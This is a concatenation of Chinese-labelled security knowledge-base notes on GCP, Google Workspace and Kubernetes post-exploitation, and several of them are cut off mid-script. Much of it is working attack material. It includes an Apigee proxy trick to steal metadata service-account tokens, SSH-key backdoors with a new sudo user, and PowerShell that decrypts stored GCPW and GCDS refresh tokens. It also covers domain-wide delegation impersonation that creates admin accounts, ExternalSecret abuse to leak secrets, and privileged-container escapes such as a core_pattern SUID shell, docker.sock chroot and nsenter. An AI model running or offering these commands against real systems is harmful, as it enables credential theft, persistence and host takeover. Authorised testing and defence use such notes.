content: 来源路径： 02-知识点/云与容器/GCP：Apigee 后渗透.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # GCP：Apigee 后渗透 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 GCP：Apigee 后渗透 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 GCP：Apigee 后渗透 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Apigee metadata SSRF -> Dataflow cross-tenant pivot、Expose the metadata server through Apigee、Enumerate the stolen Apigee service account、Snapshot exfiltration for opaque managed services、Dataflow dependency replacement via writable staging bucket；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Apigee metadata SSRF -> Dataflow cross-tenant pivot Expose the metadata server through Apigee Enumerate the stolen Apigee service account Snapshot exfiltration for opaque managed services Dataflow dependency replacement via writable staging bucket Force malicious JAR execution by abusing autoscaling Cross-tenant bucket design flaw # 核心要点 A single Apigee tenant project can be abused to reach the Message Processor metadata server, steal its service account, and pivot into a shared Dataflow analytics pipeline that reads/writes cross-tenant buckets. Set an Apigee proxy target to http://169.254.169.254 and request tokens from /computeMetadata/v1/instance/service-accounts/default/ 令牌 with Metadata-Flavor: Google. GCP metadata rejects requests containing X-Forwarded-For; Apigee adds it by default. Strip it with AssignMessage before proxying: The leaked SA (Google-managed under gcp-sa-apigee) can be enumerated with 工具 like gcpwn to quickly test permissions. Observed powerful permissions included Compute disk/snapshot admin, GCS read/write across tenant buckets, and Pub/Sub topic publish. Basic discovery: Dataflow workers lacked internet egress; exfiltrate by writing the 令牌 into an attacker-controlled GCS bucket using the in-cluster GCP APIs. customFields and datastores folders holding per-request analytics (including end-user IPs and plaintext access tokens) across all tenants. Write access implies potential analytics tampering/poisoning. # 命令 / 载荷 / 操作片段 # 1. Expose the metadata server through Apigee 12345678<AssignMessage name="strip-xff"> <Remove> <Headers> <Header name="X-Forwarded-For"/> </Headers> </Remove> <IgnoreUnresolvedVariables>true</IgnoreUnresolvedVariables></AssignMessage> # 2. Enumerate the stolen Apigee service account 1gcloud compute disks list --project <tenant-project> # 3. Force malicious JAR execution by abusing autoscaling 1234for i in {1..5000}; do gcloud pubsub topics publish apigee-analytics-notifications \ --message "flood-$i" --project <tenant-project>done # 工具与参考入口 gcpwn GatewayToHeaven: Finding a Cross-Tenant 漏洞 in GCP's Apigee AssignMessage policy：header removal # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 SSRF 服务端请求伪造 云身份与权限 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/云与容器/GCP：Add Custom SSH Metadata 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # GCP：Add Custom SSH Metadata 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 GCP：Add Custom SSH Metadata 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 GCP：Add Custom SSH Metadata 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：GCP：Add Custom SSH Metadata、Modifying the metadata <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>、Incorporation of SSH Keys into Custom Metadata、Add SSH key to existing privileged user、Create a new privileged user and add a SSH key；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 GCP：Add Custom SSH Metadata Modifying the metadata <a href="#modifying-the-metadata" id="modifying-the-metadata"></a> Incorporation of SSH Keys into Custom Metadata Add SSH key to existing privileged user Create a new privileged user and add a SSH key SSH keys at project level <a href="#sshing-around" id="sshing-around"></a> # 核心要点 Metadata modification on an instance could lead to significant security risks if an attacker gains the necessary permissions. Execute the command to describe the instance and its metadata to locate existing SSH keys. The relevant section in the output will be under metadata, specifically the ssh-keys key. Connect to the instance with SSH using the new key, accessing the shell in the context of the target user (alice in this example). If no interesting user is found, it's possible to create a new one which will be given sudo privileges: # 命令 / 载荷 / 操作片段 # 1. Add SSH key to existing privileged user 1gcloud compute instances describe [INSTANCE] --zone [ZONE] # 2. Add SSH key to existing privileged user 1ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub # 3. Add SSH key to existing privileged user 1gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt # 4. Add SSH key to existing privileged user 12ssh -i ./key alice@localhost sudo id # 5. Create a new privileged user and add a SSH key 123456789101112131415# define the new account usernameNEWUSER="definitelynotahacker"# create a keyssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""# create the input meta fileNEWKEY="$(cat ./key.pub)"echo "$NEWUSER:$NEWKEY" > ./meta.txt# update the instance metadatagcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt# ssh to the new accountssh -i ./key "$NEWUSER"@localhost # 6. SSH keys at project level <a href="#sshing-around" id="sshing-around"></a> 1gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt # 工具与参考入口 Python Linux Guest Environment for Google Compute Engine # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Moreover, this will store tokens to access Google Workspace in some places in the PC. Note that Winpeas is capable to detect GCPW, get information about the configuration and even tokens. When a user access a Windows PC synchronized with Google Workspace via GCPW it will need to complete a common login form. This login form will return an OAuth code that the PC will exchange for the refresh 令牌 in a request like: New lines have been added to make it more readable. It was possible to perform a MitM by installing Proxifier in the PC, overwriting the utilman.exe binary with a cmd.exe and executing the accessibility features in the Windows login page, which will execute a CMD from which you can launch and configure the Proxifier.\ Moreover adding the keys enable verbose logging = 1 and log file path = C:\Public\gcpw.log in HKLM:\SOFTWARE\Google\GCPW it's possible to make it store some logs. Get an access 令牌 with all those scopes: API domain: [kDefaultEscrowServiceServerUrl[] = L"https://devicepasswordescrowforwindows-pa.googleapis.com";](https://github.com/chromium/chromium/blob/a66c3ddadf5699b5493c3bce9498e53b249d5ba3/chrome/credential provider/gaiacp/mdm utils.cc#L78) # 命令 / 载荷 / 操作片段 # 1. GCPW：MitM 12345678910111213POST /oauth2/v4/token HTTP/2Host: www.googleapis.comContent-Length: 311Content-Type: application/x-www-form-urlencoded[...headers...]scope=https://www.google.com/accounts/OAuthLogin&grant_type=authorization_code&client_id=77185425430.apps.googleusercontent.com&client_secret=[REDACTED_SECRET]&code=[REDACTED_SECRET]&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f&device_type=chrome # 2. GCPW：Fingerprint 12345678910111213141516171819202122# Check process gcpw_extension.exeif (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) { Write-Output "The process gcpw_xtension.exe is running."} else { Write-Output "The process gcpw_xtension.exe is not running."}# Check if HKLM\SOFTWARE\Google\GCPW\Users exists$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"if (Test-Path $gcpwHKLMPath) { Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."} else { Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."}# Check if HKCU\SOFTWARE\Google\Accounts exists$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"if (Test-Path $gcpwHKCUPath) { Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."} else { Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."} # 3. GCPW：Registry Refresh Tokens 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# Import required namespace for decryptionAdd-Type -AssemblyName System.Security# Base registry path$baseKey = "HKCU:\SOFTWARE\Google\Accounts"# Function to search and decrypt refresh_token valuesfunction Get-RegistryKeysAndDecryptTokens { param ( [string]$keyPath ) # Get all values within the current key $registryKey = Get-Item -Path $keyPath $foundToken = $false # Loop through properties to find refresh_token foreach ($property in $registryKey.Property) { if ($property -eq "refresh_token") { $foundToken = $true try { # Get the raw bytes of the refresh_token from the registry $encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property # Decrypt the bytes using ProtectedData.Unprotect $decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser) $decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes) Write-Output &quot

GCP-IAM-Privilege-Escalation: Scripts to enumerate high IAM privileges and to escalate privileges in GCP abusing them (I couldn’t make run the enumerate script). BF My GCP Permissions: Script to bruteforce your permissions. # 命令 / 载荷 / 操作片段 # 1. Whoami 1234567#If you are inside a compromise machinegcloud auth listcurl -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$(gcloud auth print-access-token)" https://www.googleapis.com/oauth2/v1/tokeninfogcloud auth print-identity-token #Get info from the token#If you compromised a metadata token or somehow found an OAuth tokencurl -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=<token>" https://www.googleapis.com/oauth2/v1/tokeninfo # 2. Whoami 123curl -H "Content-Type: application/x-www-form-urlencoded" -H "Authorization: OAuth $(gcloud auth print-access-token)" https://www.googleapis.com/oauth2/v1/userinfocurl -H "Content-Type: application/x-www-form-urlencoded" -H "Authorization: OAuth <access_token>" https://www.googleapis.com/oauth2/v1/userinfo # 3. Org 枚举 1234# Get organizationsgcloud organizations list #The DIRECTORY_CUSTOMER_ID is the Workspace IDgcloud resource-manager folders list --organization <org_number> # Get foldersgcloud projects list # Get projects # 4. Automatic 工具 12345678# Installgit clone https://github.com/google/gcp_scanner.gitcd gcp_scannervirtualenv -p python3 venvsource venv/bin/activatepip install -r requirements.txt# Execute with gcloud credspython3 __main__.py -o /tmp/output/ -g "$HOME/.config/gcloud" # 5. gcloud config & debug 123456789101112# Login so gcloud can use your credentialsgcloud auth logingcloud config set project security-devboxgcloud auth print-access-token# Login so SDKs can use your user credentialsgcloud auth application-default logingcloud auth application-default set-quota-project security-devboxgcloud auth application-default print-access-token# Update gcloudgcloud components update # 6. Capture gcloud, gsutil... network 1234567891011121314gcloud config set proxy/address 127.0.0.1gcloud config set proxy/port 8080gcloud config set proxy/type httpgcloud config set auth/disable_ssl_validation True# If you don't want to completely disable ssl_validation use:gcloud config set core/custom_ca_certs_file cert.pem# Back to normalgcloud config unset proxy/addressgcloud config unset proxy/portgcloud config unset proxy/typegcloud config unset auth/disable_ssl_validationgcloud config unset core/custom_ca_certs_file # 7. content: 来源路径： 02-知识点/云与容器/GCP ---- Workspace Pivoting 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # GCP ---- Workspace Pivoting 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 GCP ---- Workspace Pivoting 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 GCP ---- Workspace Pivoting 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：GCP <--> Workspace Pivoting、From GCP to GWS、Domain Wide Delegation basics、Compromise existing delegation、GCP Generate Delegation 令牌；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 GCP <--> Workspace Pivoting From GCP to GWS Domain Wide Delegation basics Compromise existing delegation GCP Generate Delegation 令牌 DelePwn DeleFriend Gitlab's Python script Create a new delegation (持久化) Cross-Organizational delegation Creating a Project to enumerate Workspace Abusing Gcloud 凭据 From GWS to GCP Access privileged GCP users Google Groups 权限提升 # 核心要点 Google Workspace's Domain-Wide delegation allows an identity object, either an external app from Google Workspace Marketplace or an internal GCP Service Account, to access data across the Workspace on behalf of users. This basically means that service accounts inside GCP projects of an organization might be able to impersonate Workspace users of the same organization (or even from a different one). gcp-understanding-domain-wide-delegation.md With a list of all the service accounts he has access to and the list of Workspace emails, the attacker could try to impersonate user with each service account. However, the privileges of the impersonated user will be used, so if it's Super Admin you will be able to access everything. If it doesn't have any access this will be useless. This simple script will generate an OAuth 令牌 as the delegated user that you can then use to access other Google APIs with or without gcloud: # 命令 / 载荷 / 操作片段 # 1. GCP Generate Delegation 令牌 12345# Impersonate indicated userpython3 gen_delegation_token.py --user-email <user-email> --key-file <path-to-key-file># Impersonate indicated user and add additional scopespython3 gen_delegation_token.py --user-email <user-email> --key-file <path-to-key-file> --scopes "https://www.googleapis.com/auth/userinfo.email, https://www.googleapis.com/auth/cloud-platform, https://www.googleapis.com/auth/admin.directory.group, https://www.googleapis.com/auth/admin.directory.user, https://www.googleapis.com/auth/admin.directory.domain, https://mail.google.com/, https://www.googleapis.com/auth/drive, openid" # 2. Gitlab's Python script 12345678910111213141516171819# Install requirementspip install --upgrade --user oauth2client# Validate access only./gcp_delegation.py --keyfile ./credentials.json \ --impersonate steve.admin@target-org.com \ --domain target-org.com# List the directory./gcp_delegation.py --keyfile ./credentials.json \ --impersonate steve.admin@target-org.com \ --domain target-org.com \ --list# Create a new admin account./gcp_delegation.py --keyfile ./credentials.json \ --impersonate steve.admin@target-org.com \ --domain target-org.com \ --account pwned # 3. Creating a Project to enumerate Workspace 123456789101112131415# Create projectgcloud projects create <uniq-projec-name> --name=proj-name# Set projectgcloud config set project <uniq-projec-name># Enable svcsgcloud services enable admin.googleapis.comgcloud services enable cloudidentity.googleapis.com# Get org IDgcloud organizations list# Get currents email user groups (at least you can check the groups and members of the groups you belong to)gcloud identity groups memberships search-transitive-groups --member-email <email> --labels=cloudidentity.googleapis.com/groups.discussion_forumgcloud identity groups memberships list --group-email=g<group-email># FROM HERE THE USER NEEDS TO HAVE ENOUGH WORKSPACE ACCESSgcloud beta identity groups preview --customer <org-cust-id> # 4. Abusing Gcloud 凭据 1gcloud auth login --enable-gdrive-access # 工具与参考入口 GCP Generate Delegation 令牌 DelePwn DeleFriend Gitlab's Python script this Python script https://admin.google.com/u/1/ac/owl/domainwidedelegation here https://groups.google.com/ # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 Pwn 基础链路 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

So, it might be possible to find it inside a domain server that would be synchronising users from time to time. Note that Winpeas is capable to detect GCDS, get information about the configuration and even the passwords and encrypted 凭据. Also note that GCDS won't synchronize passwords from AD to Workspace. If something it'll just generate random passwords for newly created users in Workspace as you can see in the following image: <summary>Powershell script to decrypt the refresh 令牌 and the 密码 </summary> Just like with GCPW, it's possible to dump the memory of the process of the config-manager.exe process (it's the name of the GCDS main binary with GUI) and you will be able to find refresh and access tokens (if they have been generated already).\ I guess you could also find the AD configured 凭据. # 命令 / 载荷 / 操作片段 # 1. GCDS：Disk Tokens & AD 凭据 12345678910111213141516171819202122[...]<loginMethod>OAUTH2</loginMethod><oAuth2RefreshToken>[REDACTED_SECRET]</oAuth2RefreshToken><oAuth2Scopes><scope>https://www.google.com/m8/feeds/</scope><scope>https://www.googleapis.com/auth/admin.directory.group</scope><scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope><scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope><scope>https://www.googleapis.com/auth/admin.directory.user</scope><scope>https://www.googleapis.com/auth/admin.directory.userschema</scope><scope>https://www.googleapis.com/auth/apps.groups.settings</scope><scope>https://www.googleapis.com/auth/apps.licensing</scope><scope>https://www.googleapis.com/auth/plus.me</scope></oAuth2Scopes>[...]<hostname>192.168.10.23</hostname><port>389</port><basedn>dc=hacktricks,dc=local</basedn><authType>SIMPLE</authType><authUser>DOMAIN\domain-admin</authUser><authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>[...] # 2. GCDS：Disk Tokens & AD 凭据 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091# Paths and key names$xmlConfigPath = "C:\Users\c\Documents\conf.xml"$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"$ivKeyName = "/Encryption/Policy/V2.iv"$keyKeyName = "/Encryption/Policy/V2.key"# Open the registry keytry { $regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath) if (-not $regKey) { Throw "Registry key not found: HKCU\$regPath" }}catch { Write-Error "Failed to open registry key: $_" exit}# Get Base64-encoded IV and Key from the registrytry { $ivBase64 = $regKey.GetValue($ivKeyName) $ivBase64 = $ivBase64 -replace '/', '' $ivBase64 = $ivBase64 -replace '\\', '/' if (-not $ivBase64) { Throw "IV not found in registry" } $keyBase64 = $regKey.GetValue($keyKeyName) $keyBase64 = $keyBase64 -replace '/', '' $keyBase64 = $keyBase64 -replace '\\', '/' if (-not $keyBase64) { Throw "Key not found in registry" }}catch { Write-Error "Failed to read registry values: $_" exit}$regKey.Close()# Decode Base64 IV and Key$ivBytes = [Convert]::FromBase64String($ivBase64)$keyBytes = [Convert]::FromBase64String($keyBase64)# Read XML content$xmlContent = Get-Content -Path $xmlConfigPath -Raw# Extract Base64-encoded encrypted values using regex$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")$refreshTokenBase64 = $refreshTokenMatch.Gro

A foothold in a Kubernetes / openshift cluster with admin privileges on a namespace Read access on at least ExternalSecret at cluster level Assuming that you have a users which has enough rights to read this resource; start by first listing existing ClusterSecretStores . Let's assume you found a ClusterSecretStore named mystore . Continue by enumerating its associated externalsecret. This resource is namespace scoped so unless you already know which namespace to look for, add the -A option to look across all namespaces. # 命令 / 载荷 / 操作片段 # 1. Gathering information about existing ClusterSecretStore 1kubectl get ClusterSecretStore # 2. ExternalSecret 枚举 1kubectl get externalsecret -A | grep mystore # 3. ExternalSecret 枚举 1kubectl get externalsecret myexternalsecret -n mynamespace -o yaml # 4. Assembling the pieces 1234567891011121314kind: ExternalSecretmetadata: annotations: ... labels: ...spec: data: - remoteRef: conversionStrategy: Default decodingStrategy: None key: SECRET_KEY secretKey: SOME_PASSWORD ... # 5. Assembling the pieces 12345678910111213141516171819kind: ExternalSecretmetadata: name: myexternalsecret namespace: evilnamespacespec: data: - remoteRef: conversionStrategy: Default decodingStrategy: None key: SECRET_KEY secretKey: SOME_PASSWORD refreshInterval: 30s secretStoreRef: kind: ClusterSecretStore name: mystore target: creationPolicy: Owner deletionPolicy: Retain name: leaked_secret # 6. Assembling the pieces 123456789kind: Namespacemetadata: annotations: required_annotation: value other_required_annotation: other_value labels: required_label: somevalue other_required_label: someothervalue name: evilnamespace # 7. It gives you a service inside your cluster that other apps inside your cluster can access. There is no external access. However, this can be accessed using the Kubernetes Proxy: Now, you can navigate through the Kubernetes API to access services using this scheme: Exposes the Service externally using a cloud provider's load balancer. On GKE, this will spin up a Network Load Balancer that will give you a single IP address that will forward all traffic to your service. In AWS it will launch a Load Balancer. Traffic that ingresses into the cluster with the external IP (as destination IP), on the Service port, will be routed to one of the Service endpoints. externalIPs are not managed by Kubernetes and are the responsibility of the cluster administrator. # 命令 / 载荷 / 操作片段 # 1. Automatic 枚举 123456789kubectl get namespace -o custom-columns='NAME:.metadata.name' | grep -v NAME | while IFS='' read -r ns; do echo "Namespace: $ns" kubectl get service -n "$ns" kubectl get ingress -n "$ns" echo "==============================================" echo "" echo ""done | grep -v "ClusterIP"# Remove the last '| grep -v "ClusterIP"' to see also type ClusterIP # 2. ClusterIP 1kubectl proxy --port=8080 # 3. ClusterIP 12345678910111213apiVersion: v1kind: Servicemetadata: name: my-internal-servicespec: selector: app: my-app type: ClusterIP ports: - name: http port: 80 targetPort: 80 protocol: TCP # 4. ClusterIP 1kubectl get services --all-namespaces -o=custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.spec.type,CLUSTER-IP:.spec.clusterIP,PORT(S):.spec.ports[*].port,TARGETPORT(S):.spec.ports[*].targetPort,SELECTOR:.spec.selector' | grep ClusterIP # 5. NodePort 1kubectl get services --all-namespaces -o=custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.spec.type,CLUSTER-IP:.spec.clusterIP,PORT(S):.spec.ports[*].port,NODEPORT(S):.spec.ports[*].nodePort,TARGETPORT(S):.spec.ports[*].targetPort,SELECTOR:.spec.selector' | grep NodePort # 6. NodePort 1234567891011121314apiVersion: v1kind: Servicemetadata: name: my-nodeport-servicespec: selector: app: my-app type: NodePort ports: - name: http port: 80 targetPort: 80 nodePort: 30036 protocol: TCP # 7. LoadBalancer 1kubectl get services --all-namespaces -o=custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.spec.type,CLUSTER-IP:.spec.clusterIP,EXTERNAL-IP:.status.loadBalancer.ingress[*],PORT(S):.spec.ports[*].port,NODEPORT(S):.spec.ports[*].nodePort,TARGETPORT(S):.spec.ports[*].targetPort,SELECTOR:.spec.selector' | grep LoadBalancer # 8. External IPs 1234567891011121314apiVersion: v1kind: Servicemetadata: name: my-servicespec: selector: app: MyApp ports: - name: http protocol: TCP port: 80 targetPort: 9376 externalIPs: - 80.11.12.10 # 9. ExternalName 12345678apiVersion: v1kind: Servicemetadata: name: my-service namespace: prodspec: type: ExternalName externalName: my.database.example.com # 10. ExternalName 1kubectl get services --all-namespaces | grep ExternalName # 11. Ingress 12345678910111213141516171819202122apiVersion: extensions/v1beta1kind: Ingressmetadata: name: my-ingressspec: backend: serviceName: other servicePort: 8080 rules: - host: foo.mydomain.com http: paths: - backend: serviceName: foo servicePort: 8080 - host: mydomain.com http: paths: - path: /bar/* backend: serviceName: bar servicePort: 8080 # 12. Ingress 1kubectl get ingresses --all-namespaces -o=custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name,RULES:spec.rules[*],STATUS:status' # 13. Ingress 1kubectl get ingresses --all-namespaces -o=yaml # 工具与参考入口 Network Load Balancer From the docs: HTTP(S) Load Balancer https://Kubernetes.io/docs/concepts/services-networking/service/ # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 容器与 Kubernetes # 扩展记录 可在

content: 来源路径： 02-知识点/云与容器/Escaping From --privileged Containers 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Escaping From --privileged Containers 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Escaping From --privileged Containers 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Escaping From --privileged Containers 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Escaping From --privileged Containers、Overview、What --privileged Does Not Automatically Change、Escape Paths、Mount The Host Disk Through Exposed Devices；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 14 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Escaping From --privileged Containers Overview What --privileged Does Not Automatically Change Escape Paths Mount The Host Disk Through Exposed Devices Mount Or Reuse A Host Bind Mount And chroot Abuse Writable /proc/sys Or /sys Use Full Capabilities For Mount- Or Namespace-Based Escape Escape Through Runtime Sockets Remove Network Isolation Side Effects Read Host Secrets And Runtime State Checks Related Pages # 核心要点 many kernel filesystems stop being mounted read-only The important consequence is that a privileged 容器 usually does not need a subtle kernel 利用. In many cases it can simply interact with host devices, host-facing kernel filesystems, or runtime interfaces directly and then pivot into a host shell. --privileged does not automatically join the host PID, network, IPC, or UTS namespaces. A privileged 容器 can still have private namespaces. That means some escape chains require an extra condition such as: Those conditions are often easy to satisfy in real misconfigurations, but they are conceptually separate from --privileged itself. A privileged 容器 usually sees far more device nodes under /dev. If the host block device is visible, the simplest escape is to mount it and chroot into the host filesystem: If the root partition is not obvious, enumerate the block layout first: missing read-only system paths the default privileged capability set privileged runtime exposure # 命令 / 载荷 / 操作片段 # 1. Mount The Host Disk Through Exposed Devices 12345ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/nullmkdir -p /mnt/hostdiskmount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/nullls -la /mnt/hostdiskchroot /mnt/hostdisk /bin/bash 2>/dev/null # 2. Mount The Host Disk Through Exposed Devices 123fdisk -l 2>/dev/nullblkid 2>/dev/nulldebugfs /dev/sda1 2>/dev/null # 3. Mount The Host Disk Through Exposed Devices 1mount | grep -v "nosuid" # 4. Mount Or Reuse A Host Bind Mount And chroot 123mount | grep -E ' /host| /mnt| /rootfs'ls -la /host 2>/dev/nullchroot /host /bin/bash 2>/dev/null || /host/bin/bash -p # 5. Mount Or Reuse A Host Bind Mount And chroot 123mkdir -p /tmp/hostmount --bind / /tmp/hostchroot /tmp/host /bin/bash 2>/dev/null # 6. Abuse Writable /proc/sys Or /sys 12345678910111213141516171819[ -w /proc/sys/kernel/core_pattern ] || exit 1overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)cat <<'EOF' > /shell.sh#!/bin/shcp /bin/sh /tmp/rootshchmod u+s /tmp/rootshEOFchmod +x /shell.shecho "|$overlay/shell.sh" > /proc/sys/kernel/core_patterncat <<'EOF' > /tmp/crash.cint main(void) { char buf[1]; for (int i = 0; i < 100; i++) buf[i] = 1; return 0;}EOFgcc /tmp/crash.c -o /tmp/crash/tmp/crashls -l /tmp/rootsh # 7. Abuse Writable /proc/sys Or /sys 1234cat /proc/sys/kernel/modprobe 2>/dev/nullcat /proc/sys/fs/binfmt_misc/status 2>/dev/nullfind /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50 # 8. Use Full Capabilities For Mount- Or Namespace-Based Escape 123capsh --print | grep cap_sys_adminwhich nsenternsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked" # 9. Use Full Capabilities For Mount- Or Namespace-Based Escape 12ps -ef | head -n 50nsenter -t 1 -m -u -n -i -p /bin/bash # 10. Escape Through Runtime Sockets 12find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/nulldocker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null # 11. Escape Through Runtime Sockets 1ctr --address /run/containerd/containerd.sock images ls 2>/dev/null # 12. Remove Network Isolation Side Effects 123456capsh --print | grep cap_net_adminip addrip routeiptables -S 2>/dev/null || nft list ruleset 2>/dev/nullip link set lo down 2>/dev/nulliptables -F 2>/dev/null # 13. Read Host Secrets And Runtime State 123find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20find /var/lib/containerd -type f 2>/dev/null | head -n 50 # 14. Checks 123456c

